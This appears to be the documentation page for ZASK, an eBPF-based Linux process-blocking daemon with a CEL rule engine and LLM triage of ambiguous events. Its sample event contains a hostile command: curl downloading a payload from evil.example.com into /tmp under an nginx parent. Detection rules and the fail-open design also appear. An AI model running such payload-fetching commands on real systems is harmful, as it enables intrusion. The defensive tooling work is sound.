# Core Capabilities

Why ZASK? The following section lists the design principles & capabilities:

## Kernel-level Enforcement

Using eBPF LSM hooks, ZASK operates at the kernel level, allowing it to block malicious processes before they can execute harmful actions. 

This technique allows ZASK to work across all Linux distributions, as long as the kernel supports eBPF and LSM.

## AI-Powered Triage

The unique value proposition of ZASK is the integration of AI into the kernel-level security stack. By escalating ambiguous cases to an LLM, ZASK can potentially identify novel attack patterns that deterministic rules would miss. For example, while a standard rule engine might miss a heavily obfuscated base64 payload piped into bash, or a webserver running a shell, the LLM tier can decode and semantically understand the intent.

The events sent to the LLM include comprehensive context for analysis:

```yaml
User: root (UID 0)
Command: /usr/bin/curl -o /tmp/payload https://evil.example.com/shell
Parent: nginx
Parent Command: /usr/sbin/nginx -g daemon off;
Service: /system.slice/nginx.service
```

## Enforcement Switch

ZASK can operate in two modes:
- **Lockdown** (default) — enforces verdicts by killing processes and updating the kernel block map.
- **Monitor** — evaluates all tiers and emits audit events but never enforces, useful for dry-run.

## Expressive Rule Engine

The deterministic rule engine supports [CEL (Common Expression Language)](https://github.com/google/cel-go) expressions that can combine multiple event attributes. This allows for more expressive rules. For example,

```yaml
- name: allow-system-binaries
  condition: 'argv.startsWith("/usr/bin/") || argv.startsWith("/usr/sbin/")'
  action: ALLOW
  severity: info
```

Rules are aware of script interpreters (configurable list), a common evasion technique. When an interpreter executes a script, ZASK captures the script path from arguments. This allows more complex rules and AI models should be able to reason about the whole semantic being executed, not just the interpreter. For example, the following rule blocks any script executed by root that resides in `/tmp`, a common staging area for attacks:

```yaml
- name: tmp-root-script
  condition: 'script_path.startsWith("/tmp/") && uid == 0'
  action: BLOCK
  severity: critical
```

## Sigma based rules [planned]

ZASK will support Sigma-like rules. This allows security teams to easily translate existing Sigma rules into ZASK policies, leveraging the rich ecosystem of Sigma signatures for Linux process behaviors. 

## AI Resilience & Fail-Safe Defaults

ZASK treats AI availability as an operational concern, not a hard dependency. If the LLM provider is slow, unreachable, or overwhelmed these patterns ensure the daemon remains operational:

- **Circuit breaker** — automatically opens after repeated failures, preventing request pile-ups. Transitions through half-open probing back to closed when the provider recovers. ZASK uses the [sony/gobreaker](https://github.com/sony/gobreaker/) library for this pattern.
- **Fail-open default** — when the circuit is open, the AI queue is full, or the per-second rate limit is exceeded, events default to `ALLOW` with a logged warning. Executions are never silently dropped and the daemon keeps running normally.
- **Retry with exponential backoff** — transient 5xx errors are retried before the circuit breaker records a failure.

This ensures the daemon remains operational and predictable in production even without AI connectivity.

## Cloud-native

ZASK is built to feel immediately familiar to anyone who operates Kubernetes clusters:
- Configuration is driven entirely by a YAML file (hot-reloaded on change), which can be served to the daemon via a `ConfigMap` and credentials in a `Secret`. 
- The daemon exposes standard Kubernetes probe endpoints — `GET /healthz` (liveness) and `GET /readyz` (readiness, depends on eBPF load and ring buffer active)
- A Prometheus `/metrics` endpoint exposes functional metrics for standard scraping *(planned)*
- Operationally, ZASK runs as a **DaemonSet** — one pod per node — relying on the fact that all containers on a node share the host kernel. 

## Tamper-Resistant Binary Identity via IMA

ZASK uses **[IMA (Integrity Measurement Architecture)](https://sourceforge.net/p/linux-ima/wiki/Home/)** to identify binaries by their SHA-256 content hash rather than by inode number. This provides three concrete security benefits:

1. **Tamper detection:** If an attacker overwrites a binary in-place (same path, same inode), IMA detects the changed content and the old ALLOW verdict no longer applies.
2. **Cross-container deduplication:** Identical container images on different nodes could share hash information.
3. **Hash-based threat intel:** STIX/TAXII feeds, VirusTotal, and Sigma `Hashes` fields distribute known-bad SHA-256 hashes; ZASK can consume them directly.

## Multi-Format Audit Logging

The goal of ZASK is to integrate into a cluster-wide logging pipeline (e.g., Fluent Bit). Security events are written to one or more audit outputs simultaneously:

- **JSON** (NDJSON) — for log pipelines and external SIEM integration
- **Parquet** — columnar format for effective storage and retrieval *(planned)*
- **Text** — human-readable console output *(planned)*

## Daemon Self-Protection

ZASK deamon has a self-protection mechanism that blocks `SIGKILL` and `SIGTERM` from external processes to prevent attackers from terminating it. This can be disabled in the configuration if needed for debugging or development.